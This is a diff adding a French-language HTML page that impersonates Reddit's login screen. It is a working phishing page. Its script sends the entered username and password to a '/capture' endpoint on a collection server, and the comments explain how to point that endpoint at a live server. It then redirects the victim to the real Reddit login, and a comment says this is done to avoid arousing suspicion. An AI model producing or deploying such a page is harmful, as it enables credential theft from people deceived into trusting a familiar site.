@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion à Reddit</title>
+    <style>
+        body {
+            font-family: 'IBMPlexSans', sans-serif;
+            background-color: #DAE0E6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 4px;
+            width: 350px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .reddit-logo {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #EDEFF1;
+            background-color: #F6F7F8;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border: 1px solid #0079D3;
+            background-color: white;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0079D3;
+            color: white;
+            border: none;
+            border-radius: 999px; /* Bouton arrondi style Reddit */
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #3394dc;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            margin-top: 20px;
+            color: #787C7E;
+        }
+
+        .footer-text a {
+            color: #0079D3;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <!-- Icone simplifiée -->
+    <img src="https://www.redditstatic.com/desktop2x/img/favicon/android-icon-192x192.png" alt="Reddit" class="reddit-logo">
+    
+    <h1>Se connecter</h1>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" placeholder="NOM D'UTILISATEUR" required>
+        </div>
+        <div class="input-group">
+            <input type="password" placeholder="MOT DE PASSE" required>
+        </div>
+        
+        <button type="submit" class="login-btn">Connexion</button>
+    </form>
+
+    <p class="footer-text">
+        Mot de passe oublié ? <a href="#">Réinitialiser</a><br><br>
+        Nouveau sur Reddit ? <a href="#">S'INSCRIRE</a>
+    </p>
+</div>
+
+<script>
+    const loginForm = document.getElementById('loginForm');
+
+    loginForm.addEventListener('submit', async function(event) {
+        event.preventDefault();
+
+        const username = event.target.querySelector('input[type="text"]').value;
+        const password = event.target.querySelector('input[type="password"]').value;
+
+        try {
+            // Envoi des données au serveur (remplace localhost par l'URL de ton serveur une fois en ligne)
+            await fetch('http://localhost:3000/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+
+            // Redirection vers le vrai Reddit pour ne pas éveiller de soupçons
+            window.location.href = "https://www.reddit.com/login/";
+        } catch (error) {
+            console.error("Erreur d'envoi", error);
+        }
+    });
+</script>
+</body>
+</html>
